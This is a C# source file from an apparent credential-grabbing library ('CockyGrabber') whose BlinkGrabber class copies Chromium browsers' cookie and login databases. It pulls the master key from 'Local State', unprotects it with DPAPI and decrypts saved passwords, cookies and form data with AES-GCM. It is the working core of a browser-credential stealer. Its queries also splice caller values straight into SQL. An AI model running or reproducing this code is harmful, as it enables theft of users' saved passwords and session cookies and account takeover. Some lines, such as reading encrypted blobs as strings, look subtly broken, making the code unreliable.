using CockyGrabber.Utility;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web.Script.Serialization;

namespace CockyGrabber.Grabbers
{
    public class BlinkGrabber
    {
        private const string CookieCommandText = "SELECT creation_utc,top_frame_site_key,host_key,name,value,encrypted_value,path,expires_utc,is_secure,is_httponly,last_access_utc,has_expires,is_persistent,priority,samesite,source_scheme,source_port,is_same_party FROM cookies";
        private const string LoginCommandText = "SELECT origin_url,action_url,username_element,username_value,password_element,password_value,submit_element,signon_realm,date_created,blacklisted_by_user,scheme,password_type,times_used,form_data,display_name,icon_url,federation_url,skip_zero_click,generation_upload_status,possible_username_pairs,id,date_last_used,moving_blocked_for,date_password_modified FROM logins";
        public virtual string CookiePath { get; set; }
        public virtual string LocalStatePath { get; set; }
        public virtual string LoginDataPath { get; set; }

        private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();
        public BlinkGrabber()
        {
            JSON_Serializer.RegisterConverters(new[] { new DynamicJsonConverter() }); // Register DynamicJsonConverter for dynamic JSON (De)Serialisation
        }

        #region IO Functions
        /// <summary>
        /// Copies a file to a temporary location in %temp%
        /// </summary>
        /// <param name="path">Path to the file that should be copied to a temporary location</param>
        /// <returns>The path to the temp file</returns>
        private string CopyToTempFile(string path)
        {
            string tempFilePath = GetTempFilePath();
            if (File.Exists(tempFilePath)) // If File already exists:
                return CopyToTempFile(path); // Repeat previous steps
            File.Copy(path, tempFilePath);
            return tempFilePath;
        }

        /// <summary>
        /// Create an imaginary path to a temporary file in %temp%
        /// </summary>
        /// <returns>The path to the temp file</returns>
        private string GetTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate

        /// <summary>
        /// Returns a value depending on if the database with the stored cookies was found
        /// </summary>
        /// <returns>True if the cookies exist</returns>
        public bool CookiesExist() => File.Exists(CookiePath);

        /// <summary>
        /// Returns a value depending on if the database with the stored logins was found
        /// </summary>
        /// <returns>True if the logins exist</returns>
        public bool LoginsExist() => File.Exists(LoginDataPath);

        /// <summary>
        /// Returns a value depending on if the file that stores the key for the value decryption was found
        /// </summary>
        /// <returns>True if the file with the key exist</returns>
        public bool KeyExists() => File.Exists(LocalStatePath);
        #endregion

        #region GetCookies()
        public IEnumerable<Blink.Cookie> GetCookiesBy(Blink.CookieHeader by, object value) => GetCookiesBy(by, value, GetKey());
        public IEnumerable<Blink.Cookie> GetCookiesBy(Blink.CookieHeader by, object value, byte[] key)
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!CookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookiePath}"); // throw a Exception if the Cookie DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = CopyToTempFile(CookiePath);

            using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"{CookieCommandText} WHERE {by} = '{value}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        // Store retrieved information:
                        cookies.Add(new Blink.Cookie()
                        {
                            CreationUTC = WebkitTimeStampToDateTime(reader.GetInt64(0)),
                            TopFrameSiteKey = reader.GetString(1),
                            HostKey = reader.GetString(2),
                            Name = reader.GetString(3),
                            Value = reader.GetString(4),
                            EncryptedValue = reader.GetString(5),
                            DecryptedValue = DecryptWithKey((byte[])reader[5], key, 3),
                            Path = reader.GetString(6),
                            ExpiresUTC = WebkitTimeStampToDateTime(reader.GetInt64(7)),
                            IsSecure = reader.GetBoolean(8),
                            IsHttpOnly = reader.GetBoolean(9),
                            LastAccessUTC = WebkitTimeStampToDateTime(reader.GetInt64(10)),
                            HasExpires = reader.GetBoolean(11),
                            IsPersistent = reader.GetBoolean(12),
                            Priority = reader.GetInt16(13),
                            Samesite = reader.GetInt16(14),
                            SourceScheme = reader.GetInt16(15),
                            SourcePort = reader.GetInt32(16),
                            IsSameParty = reader.GetBoolean(17),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return cookies;
        }

        public IEnumerable<Blink.Cookie> GetCookies() => GetCookies(GetKey());
        public IEnumerable<Blink.Cookie> GetCookies(byte[] key)
        {
            List<Blink.Cookie> cookies = new List<Blink.Cookie>();
            if (!CookiesExist()) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookiePath}"); // throw a Exception if the Cookie DB was not found

            // Copy the database to a temporary location in case it could be already in use:
            string tempFile = CopyToTempFile(CookiePath);

            using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = CookieCommandText;

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        // Store retrieved information:
                        cookies.Add(new Blink.Cookie()
                        {
                            CreationUTC = WebkitTimeStampToDateTime(reader.GetInt64(0)),
                            TopFrameSiteKey = reader.GetString(1),
                            HostKey = reader.GetString(2),
                            Name = reader.GetString(3),
                            Value = reader.GetString(4),
                            EncryptedValue = reader.GetString(5),
                            DecryptedValue = DecryptWithKey((byte[])reader[5], key, 3),
                            Path = reader.GetString(6),
                            ExpiresUTC = WebkitTimeStampToDateTime(reader.GetInt64(7)),
                            IsSecure = reader.GetBoolean(8),
                            IsHttpOnly = reader.GetBoolean(9),
                            LastAccessUTC = WebkitTimeStampToDateTime(reader.GetInt64(10)),
                            HasExpires = reader.GetBoolean(11),
                            IsPersistent = reader.GetBoolean(12),
                            Priority = reader.GetInt16(13),
                            Samesite = reader.GetInt16(14),
                            SourceScheme = reader.GetInt16(15),
                            SourcePort = reader.GetInt32(16),
                            IsSameParty = reader.GetBoolean(17),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return cookies;
        }
        #endregion

        #region GetLogins()
        public IEnumerable<Blink.Login> GetLoginsBy(Blink.LoginHeader by, object value) => GetLoginsBy(by, value, GetKey());
        public IEnumerable<Blink.Login> GetLoginsBy(Blink.LoginHeader by, object value, byte[] key)
        {
            List<Blink.Login> password = new List<Blink.Login>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!LoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login database could not be found: {LoginDataPath}"); // throw a Exception if the Login DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = CopyToTempFile(LoginDataPath);

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"{LoginCommandText} WHERE {by} = '{value}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        // Store retrieved information:
                        password.Add(new Blink.Login()
                        {
                            OriginUrl = reader.GetString(0),
                            ActionUrl = reader.GetString(1),
                            UsernameElement = reader.GetString(2),
                            UsernameValue = reader.GetString(3),
                            PasswordElement = reader.GetString(4),
                            PasswordValue = reader.GetString(5),
                            DecryptedPasswordValue = DecryptWithKey((byte[])reader[5], key, 3),
                            SubmitElement = reader.GetString(6),
                            SignonRealm = reader.GetString(7),
                            DateCreated = WebkitTimeStampToDateTime(reader.GetInt64(8)),
                            IsBlacklistedByUser = reader.GetBoolean(9),
                            Scheme = reader.GetInt32(10),
                            PasswordType = reader.GetInt32(11),
                            TimesUsed = reader.GetInt32(12),
                            FormData = DecryptWithKey((byte[])reader[13], key, 3),
                            DisplayName = reader.GetString(14),
                            IconUrl = reader.GetString(15),
                            FederationUrl = reader.GetString(16),
                            SkipZeroClick = reader.GetInt32(17),
                            GenerationUploadStatus = reader.GetInt32(18),
                            PossibleUsernamePairs = DecryptWithKey((byte[])reader[19], key, 3),
                            Id = reader.GetInt32(20),
                            DateLastUsed = WebkitTimeStampToDateTime(reader.GetInt64(21)),
                            MovingBlockedFor = DecryptWithKey((byte[])reader[22], key, 3),
                            DatePasswordModified = WebkitTimeStampToDateTime(reader.GetInt64(23)),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return password;
        }

        public IEnumerable<Blink.Login> GetLogins() => GetLogins(GetKey());
        public IEnumerable<Blink.Login> GetLogins(byte[] key)
        {
            List<Blink.Login> password = new List<Blink.Login>();
            if (!LoginsExist()) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login database could not be found: {LoginDataPath}"); // throw a Exception if the Login DB was not found

            // Copy the database to a temporary location because it could be already in use
            string tempFile = CopyToTempFile(LoginDataPath);

            using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = LoginCommandText;

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        password.Add(new Blink.Login()
                        {
                            // Store retrieved information:
                            OriginUrl = reader.GetString(0),
                            ActionUrl = reader.GetString(1),
                            UsernameElement = reader.GetString(2),
                            UsernameValue = reader.GetString(3),
                            PasswordElement = reader.GetString(4),
                            PasswordValue = reader.GetString(5),
                            DecryptedPasswordValue = DecryptWithKey((byte[])reader[5], key, 3),
                            SubmitElement = reader.GetString(6),
                            SignonRealm = reader.GetString(7),
                            DateCreated = WebkitTimeStampToDateTime(reader.GetInt64(8)),
                            IsBlacklistedByUser = reader.GetBoolean(9),
                            Scheme = reader.GetInt32(10),
                            PasswordType = reader.GetInt32(11),
                            TimesUsed = reader.GetInt32(12),
                            FormData = DecryptWithKey((byte[])reader[13], key, 3),
                            DisplayName = reader.GetString(14),
                            IconUrl = reader.GetString(15),
                            FederationUrl = reader.GetString(16),
                            SkipZeroClick = reader.GetInt32(17),
                            GenerationUploadStatus = reader.GetInt32(18),
                            PossibleUsernamePairs = DecryptWithKey((byte[])reader[19], key, 3),
                            Id = reader.GetInt32(20),
                            DateLastUsed = WebkitTimeStampToDateTime(reader.GetInt64(21)),
                            MovingBlockedFor = DecryptWithKey((byte[])reader[22], key, 3),
                            DatePasswordModified = WebkitTimeStampToDateTime(reader.GetInt64(23)),
                        });
                    }
                }
                conn.Close();
            }
            File.Delete(tempFile);

            return password;
        }
        #endregion

        /// <summary>
        /// Returns the key to decrypt encrypted BLOB database values
        /// </summary>
        public byte[] GetKey()
        {
            if (!KeyExists()) throw new GrabberException(GrabberError.LocalStateNotFound, $"The Key for decryption (Local State) could not be found: {LocalStatePath}"); // throw a Exception if the "Local State" file that stores the key for decryption was not found

            string fileText = File.ReadAllText(LocalStatePath); // Read file

            dynamic dobj = JSON_Serializer.Deserialize(fileText, typeof(object)); // Deserialize fileText
            string encKey = (string)dobj.os_crypt.encrypted_key; // this is the encrypted key as a string

            return ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine); // Decrypt the encrypted key through unprotection and return a byte Array
        }

        // undocumented;
        private string DecryptWithKey(byte[] msg, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", "key");
            if (msg == null || msg.Length == 0)
                throw new ArgumentException("Message required!", "message");

            using (var cipherStream = new MemoryStream(msg))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(msg.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return Encoding.Default.GetString(plainText);
            }
        }

        // TimeStamp To DateTimeOffset Functions:
        public static DateTimeOffset WebkitTimeStampToDateTime(long microSeconds)
        {
            DateTime dateTime = new DateTime(1601, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
            if (microSeconds != 0 && microSeconds.ToString().Length < 18)
            {
                microSeconds /= 1000000;
                dateTime = dateTime.AddSeconds(microSeconds).ToLocalTime();
            }
            return dateTime;
        }
    }
}
